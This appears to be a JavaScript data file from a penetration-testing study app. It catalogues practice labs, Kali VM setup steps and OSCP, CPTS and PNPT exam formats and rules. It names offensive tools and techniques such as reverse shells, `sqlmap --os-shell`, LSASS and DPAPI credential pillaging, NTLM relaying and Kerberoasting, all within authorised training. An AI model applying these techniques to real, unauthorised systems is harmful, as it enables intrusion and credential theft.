        badge: '100% Free Multi-Host AD',
        blurb: 'An automated multi-VM Active Directory lab you can deploy locally or in the cloud to practice full AD enumeration, Kerberoasting, ACL abuse, delegation, ADCS, and multi-forest trust attacks.'
      },
      {
        name: 'Root-Me (Challenges & Virtual Labs)',
        url: 'https://www.root-me.org/?lang=en',
        cost: '500+ free challenges; optional VIP tier',
        free: true,
        color: '#eab308',
        badge: 'Free AppSec & Network Range',
        blurb: 'Over 500 hosted challenges and full virtual environments ("Root-Me Pro / CTF all day") covering Web-Server, Web-Client, Network, App-System, Cracking, and Cryptanalysis.'
      },
      {
        name: 'TryHackMe Challenge Rooms',
        url: 'https://tryhackme.com/',
        cost: 'Hundreds of free rooms; VIP ~$14/mo',
        free: true,
        color: '#14b8a6',
        badge: 'Guided + CTF Boxes',
        blurb: 'Alongside its teaching paths, TryHackMe hosts hundreds of standalone boot-to-root machines where hints ask guiding questions ("Which port is open?", "What is in the backup file?") before you capture the flag.'
      },
      {
        name: 'Hack The Box (Labs & Starting Point)',
        url: 'https://www.hackthebox.com/',
        cost: 'Starting Point + 20 active machines free; VIP+ ~$20/mo',
        free: true,
        color: '#8b5cf6',
        badge: 'Industry Standard Range',
        blurb: 'Start with the free Starting Point tier (guided PDFs included), then move to retired Easy and Medium Linux, Windows, and Active Directory machines with VIP+ so you can check official writeups whenever you get stuck.'
      },
      {
        name: 'OffSec Proving Grounds (PG Play & Practice)',
        url: 'https://portal.offsec.com/labs/play',
        cost: 'PG Play: 3 hrs/day free; PG Practice: ~$19/mo',
        free: true,
        color: '#f59e0b',
        badge: 'Closest to OSCP Style',
        blurb: 'Built by OffSec, the creators of the OSCP. PG Play gives you 3 free hours/day on Linux/VulnHub targets; PG Practice (~$19/mo) adds OffSec-authored Windows and Linux boxes that closely mirror real OSCP standalone machines.'
      },
      {
        name: 'pwn.college (ASU Cybersecurity Dojos)',
        url: 'https://pwn.college/',
        cost: '100% Free forever',
        free: true,
        color: '#84cc16',
        badge: '100% Free Browser Linux Dojos',
        blurb: 'Created by Arizona State University: structured hands-on dojos covering Linux Luminarium, Web Security, Network Security, and System Exploitation with a free in-browser VS Code and root Linux workspace.'
      }
    ],

    // Contextualized Local Kali Lab Setup (6 uniform cards with full-spectrum progression).
    labContext: {
      browserZeroSetup: 'Using TryHackMe AttackBox, HTB Pwnbox, PicoCTF Webshell, or PortSwigger Web Academy? You need ZERO local setup. Your attack terminal runs right in your browser tab, and you can copy-paste between OBOL and your browser terminal immediately.',
      localVmWhen: 'Want to connect to HTB or Proving Grounds over OpenVPN, run offline VulnHub/HackMyVM machines, or prepare for the proctored OSCP/CPTS/PNPT exams? Follow the 6 color-coded steps below to build your own reusable Kali Linux VM in about 45 minutes.'
    },
    lab: [
      {
        step: '1',
        color: '#06b6d4',
        ic: 'layers',
        title: 'Install a Free Hypervisor',
        badge: '10 mins',
        body: 'A hypervisor lets you run Linux and target machines inside safe windows on your existing Windows, Mac, or Linux computer. Download <a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener noreferrer">VirtualBox</a> (free on all OSes) or <a href="https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion" target="_blank" rel="noopener noreferrer">VMware Workstation / Fusion</a> (free for personal use).',
        cta: { label: 'Download VirtualBox', href: 'https://www.virtualbox.org/wiki/Downloads', external: true }
      },
      {
        step: '2',
        color: '#3b82f6',
        ic: 'terminal',
        title: 'Import the Pre-Built Kali Linux VM',
        badge: '15 mins',
        body: 'Grab the official pre-built VirtualBox or VMware image from <a href="https://www.kali.org/get-kali/#kali-virtual-machines" target="_blank" rel="noopener noreferrer">kali.org/get-kali</a>. Skip the ISO installer; the pre-built VM image extracts and boots in 60 seconds with default login <code>kali</code> / <code>kali</code>.',
        cta: { label: 'Get Official Kali VM', href: 'https://www.kali.org/get-kali/#kali-virtual-machines', external: true }
      },
      {
        step: '3',
        color: '#a855f7',
        ic: 'shield',
        title: 'Take a Clean Snapshot & Set Networking',
        badge: '2 mins',
        body: 'Before installing tools or connecting to labs, take a VM Snapshot named <b>Clean Base</b> so you can roll back to a fresh state in 5 seconds. Use <b>NAT</b> for VPN ranges (HTB, THM, PG), or add a <b>Host-Only</b> adapter for local offline VMs.',
        cta: { label: 'Kali Virtualization Guide', href: 'https://www.kali.org/docs/virtualization/', external: true }
      },
      {
        step: '4',
        color: '#f43f5e',
        ic: 'globe',
        title: 'Connect to a VPN Range or Boot a Local Target',
        badge: '5 mins',
        body: 'Download an <code>.ovpn</code> connection pack from TryHackMe, HTB, or Proving Grounds to connect over OpenVPN, or import a free <code>.ova</code> target from VulnHub or HackMyVM onto the same Host-Only network as your Kali VM.',
        cta: { label: 'Browse VulnHub Targets', href: 'https://www.vulnhub.com/', external: true }
      },
      {
        step: '5',
        color: '#f59e0b',
        ic: 'package',
        title: 'Sync Your Kali Arsenal With OBOL Loadout',
        badge: '5 mins',
        body: 'Open OBOL\'s <b>Loadout</b> page to generate your Kali setup script, stage PrivEsc and tunneling binaries (<code>linpeas.sh</code>, <code>winPEASx64.exe</code>, <code>GodPotato</code>, <code>ligolo-ng</code>) into <code>/opt/obol-tools/</code>, and sync your installed tool profile.',
        cta: { label: 'Open Loadout (#/loadout)', href: '#/loadout' }
      },
      {
        step: '6',
        color: '#10b981',
        ic: 'compass',
        title: 'Start an Engagement & Paste Your First Scan',
        badge: 'Ready!',
        body: 'Open <b>Engagements (#/home)</b>, enter your target IP and your Kali VPN/Host-Only IP (<code>LHOST</code>), and launch <b>Cockpit (#/path)</b>. Copy OBOL\'s opening Nmap scan, run it in Kali, and press <kbd>Ctrl</kbd>+<kbd>V</kbd> in OBOL to build your attack path.',
        cta: { label: 'Open Engagements (#/home)', href: '#/home' }
      }
    ],

    // Exam Prep Playbook (Door 4: Prepping For An Exam).
    examWorkflow: [
      {
        step: 'Step 1',
        title: 'Select Your Exam Profile on #/home',
        color: '#06b6d4',
        href: '#/home',
        linkLabel: 'Open Engagements (#/home)',
        body: 'When creating an engagement on Engagements (#/home), select the OSCP, HTB / CPTS, or PNPT platform profile. Selecting OSCP automatically hides banned commercial scanners and flags Metasploit/sqlmap restrictions in the UI.'
      },
      {
        step: 'Step 2',
        title: 'Use the 45-Minute Circuit Breaker (#/path)',
        color: '#f43f5e',
        href: '#/path',
        linkLabel: 'Open Circuit Breaker (#/path)',
        body: 'The #1 reason candidates fail timed exams is spending 5 hours down a single rabbit hole. If you have not minted a new fact in 45 to 60 minutes, open Cockpit (#/path) to run OBOL\'s Stuck / rabbit-hole checklist or rotate to your next target.'
      },
      {
        step: 'Step 3',
        title: 'Verify Proof Screenshots as You Go (#/evidence)',
        color: '#10b981',
        href: '#/evidence',
        linkLabel: 'Open Evidence (#/evidence)',
        body: 'Never wait until the end of the exam to take proof screenshots! As soon as you capture local.txt or proof.txt, paste the combined terminal output (whoami + IP config + flag) into OBOL so Report Preflight (#/report) confirms nothing is missing while your VPN is still active.'
      },
      {
        step: 'Step 4',
        title: 'Export Your Markdown Report Draft (#/report)',
        color: '#f59e0b',
        href: '#/report',
        linkLabel: 'Open Report Builder (#/report)',
        body: 'During your reporting window, open Report (#/report) to review preflight checks, verify every host has its initial access and privilege escalation command chain attached, and export a clean Markdown walkthrough.'
      }
    ],

    exams: [
      {
        id: 'oscp',
        badge: 'OffSec PEN-200',
        name: 'OSCP (OffSec Certified Professional)',
        color: '#f43f5e',
        kicker: '23h 45m proctored hands-on exam + 24h report window',
        pills: [
          { label: 'Window', val: '23h 45m Lab + 24h Report' },
          { label: 'Passing Score', val: '70 / 100 Points' },
          { label: 'Targets', val: '1 AD Set (40p) + 3 Standalones (20p ea)' },
          { label: 'Tool Policy', val: 'Metasploit 1 Host Only · No AI / Auto-Exploit' }
        ],
        format: {
          time: '23 hours 45 minutes lab access + 24 hours to submit your PDF report',
          passingScore: '70 / 100 points minimum to pass',
          structure: '1 Active Directory set (3 machines = 40 points total, all-or-nothing on the current exam format) + 3 Standalone machines (20 points each: 10 pts for low-privilege local.txt + 10 pts for root/SYSTEM proof.txt).',
          winningMath: 'Path A: Compromise the 40-pt AD set + 1.5 Standalone boxes (40 + 20 + 10 = 70 pts). Path B (if AD stalls): Compromise all 3 Standalone boxes (60 pts) + earn at least 10 partial points on AD (if applicable) or finish the AD chain.'
        },
        rules: [
          'Banned Tools: Commercial scanners (Nessus, Burp Suite Pro active scanner, Acunetix), automated exploitation (`sqlmap --os-shell`, `autopwn`), and AI/LLM chatbots during the exam.',
          'Metasploit Restriction: You may use Metasploit (`msfconsole` / `meterpreter`) against ONLY ONE single target IP address during the entire exam. Using `msfvenom` for non-Meterpreter reverse shells and `exploit/multi/handler` for standard stageless shells is unlimited.',
          'Proof Screenshot Rule: Every `local.txt` and `proof.txt` screenshot MUST show the flag contents, `whoami` / `id`, and the target IP (`ipconfig` / `ip a`) in a single uncropped terminal view.'
        ],
        skills: [
          { label: 'Active Directory Enumeration, Kerberoasting & AS-REP Roasting', href: '#/study/topic/active-directory' },
          { label: 'Lateral Movement (Pass-the-Hash, WinRM, WMI, SMB, RDP)', href: '#/study/topic/active-directory' },
          { label: 'Ligolo-ng / Chisel Tunneling Across Internal Subnets', href: '#/study/topic/pivoting' },
          { label: 'Windows PrivEsc (SeImpersonate Potato, Services, Scheduled Tasks)', href: '#/study/topic/windows-privesc' },
          { label: 'Linux PrivEsc (sudo, SUID GTFOBins, Cron, Capabilities)', href: '#/study/topic/linux-privesc' },
          { label: 'Web Footholds (File Upload, LFI, SQLi, Command Injection)', href: '#/study/topic/web-exploitation' }
        ],
        practiceTemplate: {
          name: 'OSCP Mock Exam Sim (AD + 3 Standalones)',
          platform: 'oscp',
          targets: '10.10.10.50, 10.10.10.60, 10.10.10.65, 10.10.10.70, 10.10.10.71, 10.10.10.72',
          domain: 'corp.local',
          note: 'Pre-populates a 6-host OSCP practice layout (3 standalones + 3-host AD set) with dummy IPs you can swap for your lab targets.'
        },
        listNote: 'Recommended Practice Ranges: OffSec PEN-200 Challenge Labs (Medtech, Relia, Skylark, OSCP A/B/C), OffSec Proving Grounds Practice, and Lainkusanagi / TJNull curated multi-platform lists.'
      },
      {
        id: 'cpts',
        badge: 'HTB Academy',
        name: 'CPTS (HTB Certified Penetration Testing Specialist)',
        color: '#a855f7',
        kicker: '10-day hands-on enterprise network exam + commercial-grade report',
        pills: [
          { label: 'Window', val: '10 Full Days (Lab + Report)' },
          { label: 'Passing Score', val: '12 / 14 Flags + Commercial Report' },
          { label: 'Targets', val: 'Connected Multi-Forest Enterprise Network' },
          { label: 'Tool Policy', val: 'Unrestricted Open-Source Tools' }
        ],
        format: {
          time: '10 full days (inclusive of both hands-on compromise and writing the commercial penetration test report)',
          passingScore: 'Capture at least 12 out of 14 flags AND submit a professional, finding-by-finding commercial report',
          structure: 'A single realistic multi-forest enterprise network where every host you compromise holds credentials, tickets, or network routes needed to pivot deeper into internal subnets.',
          winningMath: 'Unlike OSCP, CPTS is a connected chain: thorough post-exploitation looting (dumping LSASS, DPAPI, browsers, config files, and routing tables on every single box) is mandatory to unlock the next subnet.'
        },
        rules: [
          'No Tool Restrictions: All open-source tools (`sqlmap`, `metasploit`, `bloodhound`, `certipy`, `ligolo-ng`, `netexec`) are permitted.',
          'Commercial Report Standard: Passing 12/14 flags is not enough on its own; your report must document every vulnerability with CVSS/severity, business impact, step-by-step reproduction, and actionable remediation.',
          'Double & Triple Pivoting: Expect to route traffic through 2 or 3 internal network hops using Ligolo-ng or Chisel + Proxychains.'
        ],
        skills: [
          { label: 'Deep Web Enumeration (VHost Fuzzing, SSRF, Deserialization, XXE)', href: '#/study/topic/web-exploitation' },
          { label: 'Multi-Hop Network Pivoting (Ligolo-ng Interfaces & Port Forwards)', href: '#/study/topic/pivoting' },
          { label: 'AD ACLs, Delegation (Unconstrained/Constrained/RBCD) & ADCS (Certipy)', href: '#/study/topic/active-directory' },
          { label: 'Post-Exploitation Credential Pillaging (DPAPI, SAM/LSASS, Configs)', href: '#/study/topic/password-cracking' }
        ],
        practiceTemplate: {
          name: 'CPTS Enterprise Pivot Practice Run',
          platform: 'htb',
          targets: '10.10.10.80, 172.16.10.10, 172.16.10.20, 172.16.20.5',
          domain: 'enterprise.corp.local',
          note: 'Pre-populates an external DMZ web host (10.10.10.80) plus internal pivot targets across 172.16.10.0/24 and 172.16.20.0/24.'
        },
        listNote: 'Recommended Practice Ranges: HTB Academy Penetration Tester Job Role Path (100% of required exam techniques are taught in the path), HTB Pro Labs (Dante, Zephyr), and IppSec\'s Unofficial CPTS Prep playlist.'
      },
      {
        id: 'pnpt',
        badge: 'TCM Security',
        name: 'PNPT (TCM Practical Network Penetration Tester)',
        color: '#f59e0b',
        kicker: '5-day external-to-Domain-Admin assessment + 2 days report + 15-min live debrief',
        pills: [
          { label: 'Window', val: '5d Lab + 2d Report + 15m Debrief' },
          { label: 'Passing Score', val: 'Full Domain Controller Compromise' },
          { label: 'Targets', val: 'OSINT Perimeter + Internal AD Domain' },
          { label: 'Tool Policy', val: 'Unrestricted Real-World Pentest Tools' }
        ],
        format: {
          time: '5 days hands-on lab access + 2 days to submit your report + a live 15-minute video debrief with an assessor',
          passingScore: 'Full compromise of the internal Active Directory Domain Controller + professional report + live debrief',
          structure: 'Starts from an external OSINT / perimeter perspective, breaches the internal corporate network, and requires lateral movement and privilege escalation across Active Directory to reach Domain Admin.',
          winningMath: 'Zero CTF flags! You win by achieving Domain Admin on the target Domain Controller and explaining every finding clearly during your live client debrief.'
        },
        rules: [
          'No Tool Restrictions: You may use any tool a real-world penetration tester uses on a client engagement.',
          'Account Lockout Awareness: Password spraying and SMB brute-forcing must respect Active Directory password lockout policies (`net accounts` / `nxc smb --pass-pol`) so you do not lock out target accounts.',
          'Live Debrief: Use OBOL\'s Findings (#/findings) and Report (#/report) views to organize your attack narrative so you can walk the assessor through your chain step-by-step.'
        ],
        skills: [
          { label: 'OSINT, Password Policy Discovery & Safe Password Spraying', href: '#/study/topic/active-directory' },
          { label: 'LLMNR / NBT-NS Poisoning (Responder) & SMB Relaying (ntlmrelayx)', href: '#/study/topic/active-directory' },
          { label: 'SMB Share Pillaging, Kerberoasting & BloodHound Path Analysis', href: '#/study/topic/active-directory' },
          { label: 'Pivoting From DMZ Host Into Internal AD Subnet', href: '#/study/topic/pivoting' }
        ],
        practiceTemplate: {
          name: 'PNPT External-to-DC Assessment Sim',
          platform: 'htb',
          targets: '10.10.10.90, 10.10.10.91, 10.10.10.92, 10.10.10.95',
          domain: 'internal.corp.local',
          note: 'Pre-populates a 4-host corporate network simulation with dummy IPs and domain `internal.corp.local`.'
        },
        listNote: 'Recommended Practice Ranges: TCM Academy 5-Course PNPT Bundle (PEH, OSINT, External Pentest Playbook, Linux 101, Windows PrivEsc) and your own local 2-workstation + 1-DC Active Directory home lab.'
      }
    ],

    // Go Deeper educational walkthroughs, video indexes, and methodology guides (with spectrum colors).
    deeper: [
      {
        name: 'IppSec.rocks (Video Walkthrough Search)',
        url: 'https://ippsec.rocks/',
        cost: '100% Free searchable video index',
        free: true,
        color: '#10b981',
        badge: '500+ Video Walkthroughs',
        blurb: 'Type any tool, port, CVE, or technique (like "kerberoast", "sqli", "suid", or "ligolo") and jump to the exact timestamp in IppSec\'s video walkthroughs where he demonstrates and explains it.'
      },
      {
        name: 'HackTricks',
        url: 'https://book.hacktricks.wiki/',
        cost: '100% Free open-source wiki',
        free: true,
        color: '#06b6d4',
        badge: 'Port & Methodology Wiki',
        blurb: 'Comprehensive pentesting methodology encyclopedia covering network services by port number, Linux and Windows privilege escalation concepts, web vulnerabilities, and Active Directory enumeration.'
      },
      {
        name: '0xdf hacks stuff (0xdf.gitlab.io)',
        url: 'https://0xdf.gitlab.io/',
        cost: '100% Free written walkthroughs',
        free: true,
        color: '#3b82f6',
        badge: 'Written Walkthroughs + Beyond Root',
        blurb: 'Detailed, step-by-step written walkthroughs of hundreds of Hack The Box and OSCP-style machines, famous for explaining why exploits work and inspecting the underlying vulnerable source code in "Beyond Root".'
      },
      {
        name: 'The Hacker Recipes',
        url: 'https://www.thehackerrecipes.com/',
        cost: '100% Free educational guides',
        free: true,
        color: '#a855f7',
        badge: 'Visual AD & Web Guides',
        blurb: 'Clear, structured conceptual guides with architecture diagrams explaining Active Directory internals, Kerberos delegation, ADCS certificate abuse, NTLM relaying, and web exploitation.'
      },
      {
        name: 'ired.team Offensive Security Notes',
        url: 'https://www.ired.team/',
        cost: '100% Free field notes',
        free: true,
        color: '#f43f5e',
        badge: 'Windows & AD Internals',
        blurb: 'Bite-sized, practical offensive security notes explaining how Windows tokens, credentials, Active Directory ACLs, Kerberos tickets, and privilege escalation primitives work under the hood.'
      },
      {
        name: 'PortSwigger Web Security Topic Guides',
        url: 'https://portswigger.net/web-security',
        cost: '100% Free illustrated articles',
        free: true,
        color: '#f59e0b',
        badge: 'Web Vulnerability Deep-Dives',
        blurb: 'In-depth educational articles and visual diagrams explaining the root cause, exploitation mechanics, and remediation of every major web application vulnerability class.'
      }
    ]
  };
})(typeof window !== 'undefined' ? window : globalThis);
